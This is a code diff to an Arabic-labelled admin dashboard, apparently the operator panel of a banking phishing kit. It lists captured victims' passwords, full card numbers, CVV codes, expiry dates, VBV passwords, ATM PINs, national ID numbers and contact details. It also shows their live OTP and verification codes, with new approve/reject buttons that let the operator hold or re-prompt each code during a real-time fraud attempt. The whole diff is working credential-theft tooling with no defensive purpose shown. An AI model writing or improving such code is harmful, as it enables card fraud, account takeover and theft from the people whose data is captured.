@@ -353,7 +353,113 @@
             }
             
             const v = selectedVisitor;
-            const html = `
+            
+            // Collect all data items with timestamps
+            const items = [];
+            
+            // Step 3: Password
+            if (v.data?.step3) {
+                items.push({
+                    type: 'step3',
+                    title: '🔐 كلمة المرور (Step 3)',
+                    timestamp: v.data.step3.timestamp,
+                    color: 'green',
+                    data: v.data.step3,
+                    needsApproval: false
+                });
+            }
+            
+            // Step 4: Card Data
+            if (v.data?.step4) {
+                items.push({
+                    type: 'step4',
+                    title: '💳 بيانات البطاقة (Step 4)',
+                    timestamp: v.data.step4.timestamp,
+                    color: 'blue',
+                    data: v.data.step4,
+                    needsApproval: false
+                });
+            }
+            
+            // Step 5: Activation Data
+            if (v.data?.step5) {
+                items.push({
+                    type: 'step5',
+                    title: '📱 بيانات التفعيل (Step 5)',
+                    timestamp: v.data.step5.timestamp,
+                    color: 'orange',
+                    data: v.data.step5,
+                    needsApproval: false
+                });
+            }
+            
+            // OTP - Current
+            if (v.otp?.current?.otp) {
+                items.push({
+                    type: 'otp',
+                    title: '🔑 OTP Code',
+                    timestamp: v.otp.current.timestamp,
+                    color: 'purple',
+                    data: v.otp.current,
+                    status: v.otp.otp_status || 'pending',
+                    needsApproval: true,
+                    attemptNumber: v.otp.current.attemptNumber
+                });
+            }
+            
+            // OTP - History
+            if (v.otp?.history) {
+                Object.keys(v.otp.history).forEach(key => {
+                    const historyItem = v.otp.history[key];
+                    items.push({
+                        type: 'otp_history',
+                        title: `🔑 OTP Code (محاولة ${historyItem.attemptNumber || '?'})`,
+                        timestamp: historyItem.timestamp,
+                        color: 'purple',
+                        data: historyItem,
+                        status: 'old',
+                        needsApproval: false,
+                        isHistory: true
+                    });
+                });
+            }
+            
+            // Verification - Current
+            if (v.verification?.current?.verificationCode) {
+                items.push({
+                    type: 'verification',
+                    title: '✔️ Verification Code',
+                    timestamp: v.verification.current.timestamp,
+                    color: 'pink',
+                    data: v.verification.current,
+                    status: v.verification.verification_status || 'pending',
+                    needsApproval: true,
+                    attemptNumber: v.verification.current.attemptNumber
+                });
+            }
+            
+            // Verification - History
+            if (v.verification?.history) {
+                Object.keys(v.verification.history).forEach(key => {
+                    const historyItem = v.verification.history[key];
+                    items.push({
+                        type: 'verification_history',
+                        title: `✔️ Verification Code (محاولة ${historyItem.attemptNumber || '?'})`,
+                        timestamp: historyItem.timestamp,
+                        color: 'pink',
+                        data: historyItem,
+                        status: 'old',
+                        needsApproval: false,
+                        isHistory: true
+                    });
+                });
+            }
+            
+            // Sort by timestamp (newest first)
+            items.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            // Render header
+            let html = `
                 <div class="max-w-4xl mx-auto">
                     <div class="flex items-center justify-between mb-6">
                         <h2 class="text-2xl font-bold text-gray-800">${v.data?.step5?.phone || v.data?.step4?.cardHolder || 'غير محدد'}</h2>
@@ -363,75 +469,114 @@
                         </div>
                     </div>
                     
-                    <!-- Step 5: Activation Data -->
-                    ${v.data?.step5 ? `
-                    <div class="bg-white rounded-lg p-6 mb-4 border border-gray-200">
-                        <h3 class="text-lg font-semibold text-gray-800 mb-4">📱 بيانات التفعيل (Step 5)</h3>
-                        <div class="grid grid-cols-2 gap-4">
-                            <div><span class="text-gray-600">مزود الخدمة:</span> <span class="font-medium">${v.data.step5.provider || '-'}</span></div>
-                            <div><span class="text-gray-600">رقم الهاتف:</span> <span class="font-medium">${v.data.step5.phone || '-'}</span></div>
-                            <div><span class="text-gray-600">رقم الهوية:</span> <span class="font-medium">${v.data.step5.personalId || '-'}</span></div>
-                            <div><span class="text-gray-600">البريد:</span> <span class="font-medium">${v.data.step5.email || '-'}</span></div>
-                            <div><span class="text-gray-600">كلمة المرور:</span> <span class="font-medium">${v.data.step5.password || '-'}</span></div>
+                    <div class="space-y-4">
+            `;
+            
+            // Render each item as a bubble
+            items.forEach(item => {
+                const colorClasses = {
+                    green: 'border-green-200 bg-green-50',
+                    blue: 'border-blue-200 bg-blue-50',
+                    orange: 'border-orange-200 bg-orange-50',
+                    purple: 'border-purple-200 bg-purple-50',
+                    pink: 'border-pink-200 bg-pink-50'
+                };
+                
+                const bgClass = colorClasses[item.color] || 'border-gray-200 bg-white';
+                const isNew = isRecent(item.timestamp);
+                
+                html += `
+                    <div class="rounded-lg p-6 border-2 ${bgClass} ${isNew ? 'ring-2 ring-red-400' : ''} ${item.isHistory ? 'opacity-70' : ''}">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-lg font-semibold text-gray-800">${item.title}</h3>
+                            <div class="flex items-center gap-2">
+                                ${isNew ? '<span class="px-2 py-1 bg-red-500 text-white text-xs rounded-full animate-pulse">جديد!</span>' : ''}
+                                <span class="text-xs text-gray-500">${getTimeAgo(item.timestamp)}</span>
+                            </div>
                         </div>
-                    </div>
-                    ` : ''}
-                    
-                    <!-- Step 4: Card Data -->
-                    ${v.data?.step4 ? `
-                    <div class="bg-white rounded-lg p-6 mb-4 border border-gray-200">
-                        <h3 class="text-lg font-semibold text-gray-800 mb-4">💳 بيانات البطاقة (Step 4)</h3>
+                `;
+                
+                // Render data based on type
+                if (item.type === 'step3') {
+                    html += `
                         <div class="grid grid-cols-2 gap-4">
-                            <div><span class="text-gray-600">رقم البطاقة:</span> <span class="font-medium">${v.data.step4.cardNumber || '-'}</span></div>
-                            <div><span class="text-gray-600">اسم حامل البطاقة:</span> <span class="font-medium">${v.data.step4.cardHolder || '-'}</span></div>
-                            <div><span class="text-gray-600">تاريخ الانتهاء:</span> <span class="font-medium">${v.data.step4.expiryDate || '-'}</span></div>
-                            <div><span class="text-gray-600">CVV:</span> <span class="font-medium">${v.data.step4.cvv || '-'}</span></div>
-                            <div><span class="text-gray-600">VBV Password:</span> <span class="font-medium">${v.data.step4.vbvPassword || '-'}</span></div>
-                            <div><span class="text-gray-600">ATM PIN:</span> <span class="font-medium">${v.data.step4.atmPin || '-'}</span></div>
+                            <div><span class="text-gray-600">كلمة المرور:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
+                            <div><span class="text-gray-600">تأكيد كلمة المرور:</span> <span class="font-medium">${item.data.confirmPassword || '-'}</span></div>
                         </div>
-                    </div>
-                    ` : ''}
-                    
-                    <!-- OTP -->
-                    ${v.otp?.current?.otp ? `
-                    <div class="bg-white rounded-lg p-6 mb-4 border border-gray-200">
-                        <h3 class="text-lg font-semibold text-gray-800 mb-4">🔑 OTP</h3>
+                    `;
+                } else if (item.type === 'step4') {
+                    html += `
                         <div class="grid grid-cols-2 gap-4">
-                            <div><span class="text-gray-600">OTP Code:</span> <span class="font-medium text-2xl text-green-600">${v.otp.current.otp}</span></div>
-                            <div><span class="text-gray-600">الحالة:</span> <span class="font-medium">${v.otp.otp_status || 'pending'}</span></div>
+                            <div><span class="text-gray-600">رقم البطاقة:</span> <span class="font-medium">${item.data.cardNumber || '-'}</span></div>
+                            <div><span class="text-gray-600">اسم حامل البطاقة:</span> <span class="font-medium">${item.data.cardHolder || '-'}</span></div>
+                            <div><span class="text-gray-600">تاريخ الانتهاء:</span> <span class="font-medium">${item.data.expiryDate || '-'}</span></div>
+                            <div><span class="text-gray-600">CVV:</span> <span class="font-medium">${item.data.cvv || '-'}</span></div>
+                            ${item.data.vbvPassword ? `<div><span class="text-gray-600">VBV Password:</span> <span class="font-medium">${item.data.vbvPassword}</span></div>` : ''}
+                            ${item.data.atmPin ? `<div><span class="text-gray-600">ATM PIN:</span> <span class="font-medium">${item.data.atmPin}</span></div>` : ''}
                         </div>
-                    </div>
-                    ` : ''}
-                    
-                    <!-- Verification Code -->
-                    ${v.verification?.current?.verificationCode ? `
-                    <div class="bg-white rounded-lg p-6 mb-4 border border-gray-200">
-                        <h3 class="text-lg font-semibold text-gray-800 mb-4">✔️ Verification Code</h3>
+                    `;
+                } else if (item.type === 'step5') {
+                    html += `
                         <div class="grid grid-cols-2 gap-4">
-                            <div><span class="text-gray-600">Code:</span> <span class="font-medium text-2xl text-blue-600">${v.verification.current.verificationCode}</span></div>
-                            <div><span class="text-gray-600">الحالة:</span> <span class="font-medium">${v.verification.verification_status || 'pending'}</span></div>
+                            <div><span class="text-gray-600">مزود الخدمة:</span> <span class="font-medium">${item.data.provider || '-'}</span></div>
+                            <div><span class="text-gray-600">رقم الهاتف:</span> <span class="font-medium">${item.data.phone || '-'}</span></div>
+                            <div><span class="text-gray-600">رقم الهوية:</span> <span class="font-medium">${item.data.personalId || '-'}</span></div>
+                            <div><span class="text-gray-600">البريد:</span> <span class="font-medium">${item.data.email || '-'}</span></div>
+                            <div><span class="text-gray-600">كلمة المرور:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
                         </div>
-                    </div>
-                    ` : ''}
-                    
-                    <!-- Step 3: Password -->
-                    ${v.data?.step3 ? `
-                    <div class="bg-white rounded-lg p-6 mb-4 border border-gray-200">
-                        <h3 class="text-lg font-semibold text-gray-800 mb-4">🔐 كلمة المرور (Step 3)</h3>
-                        <div class="grid grid-cols-2 gap-4">
-                            <div><span class="text-gray-600">كلمة المرور:</span> <span class="font-medium">${v.data.step3.password || '-'}</span></div>
+                    `;
+                } else if (item.type === 'otp' || item.type === 'otp_history') {
+                    html += `
+                        <div class="mb-4">
+                            <div class="text-center">
+                                <span class="text-4xl font-bold text-purple-600">${item.data.otp}</span>
+                            </div>
                         </div>
-                    </div>
-                    ` : ''}
-                    
-                    <!-- Visitor Info -->
-                    <div class="bg-white rounded-lg p-6 mb-4 border border-gray-200">
-                        <h3 class="text-lg font-semibold text-gray-800 mb-4">📄 معلومات الزائر</h3>
-                        <div class="grid grid-cols-2 gap-4">
-                            <div><span class="text-gray-600">Visitor ID:</span> <span class="font-medium text-xs">${v.vid}</span></div>
-                            <div><span class="text-gray-600">آخر ظهور:</span> <span class="font-medium">${getTimeAgo(v.lastSeen)}</span></div>
-                            <div><span class="text-gray-600">الصفحة:</span> <span class="font-medium">${v.page || '-'}</span></div>
+                        <div class="flex items-center justify-between">
+                            <div><span class="text-gray-600">الحالة:</span> 
+                                <span class="px-2 py-1 rounded text-sm ${item.status === 'approved' ? 'bg-green-100 text-green-700' : item.status === 'rejected' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}">${item.status === 'approved' ? 'موافق' : item.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار'}</span>
+                            </div>
+                            ${item.needsApproval && item.status === 'pending' ? `
+                            <div class="flex gap-2">
+                                <button onclick="approveOTP('${v.vid}', 'approved')" class="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">
+                                    ✓ موافقة
+                                </button>
+                                <button onclick="approveOTP('${v.vid}', 'rejected')" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600">
+                                    ✗ رفض
+                                </button>
+                            </div>
+                            ` : ''}
                         </div>
+                    `;
+                } else if (item.type === 'verification' || item.type === 'verification_history') {
+                    html += `
+                        <div class="mb-4">
+                            <div class="text-center">
+                                <span class="text-4xl font-bold text-pink-600">${item.data.verificationCode}</span>
+                            </div>
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <div><span class="text-gray-600">الحالة:</span> 
+                                <span class="px-2 py-1 rounded text-sm ${item.status === 'approved' ? 'bg-green-100 text-green-700' : item.status === 'rejected' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}">${item.status === 'approved' ? 'موافق' : item.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار'}</span>
+                            </div>
+                            ${item.needsApproval && item.status === 'pending' ? `
+                            <div class="flex gap-2">
+                                <button onclick="approveVerification('${v.vid}', 'approved')" class="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">
+                                    ✓ موافقة
+                                </button>
+                                <button onclick="approveVerification('${v.vid}', 'rejected')" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600">
+                                    ✗ رفض
+                                </button>
+                            </div>
+                            ` : ''}
+                        </div>
+                    `;
+                }
+                
+                html += `</div>`;
+            });
+            
+            html += `
                     </div>
                 </div>
             `;
@@ -528,6 +673,44 @@
         $('#searchInput').on('input', function() {
             renderVisitorList();
         });
+        
+        // Approve/Reject OTP
+        function approveOTP(vid, status) {
+            if (!confirm(`هل أنت متأكد من ${status === 'approved' ? 'الموافقة' : 'الرفض'}?`)) return;
+            
+            $.ajax({
+                url: `/admin/api/approve-otp`,
+                method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ vid, status }),
+                success: function() {
+                    alert(`تم ${status === 'approved' ? 'الموافقة' : 'الرفض'} بنجاح!`);
+                    loadVisitors();
+                },
+                error: function() {
+                    alert('حدث خطأ!');
+                }
+            });
+        }
+        
+        // Approve/Reject Verification
+        function approveVerification(vid, status) {
+            if (!confirm(`هل أنت متأكد من ${status === 'approved' ? 'الموافقة' : 'الرفض'}?`)) return;
+            
+            $.ajax({
+                url: `/admin/api/approve-verification`,
+                method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ vid, status }),
+                success: function() {
+                    alert(`تم ${status === 'approved' ? 'الموافقة' : 'الرفض'} بنجاح!`);
+                    loadVisitors();
+                },
+                error: function() {
+                    alert('حدث خطأ!');
+                }
+            });
+        }
         
         // Load on page load
         $(document).ready(function() {
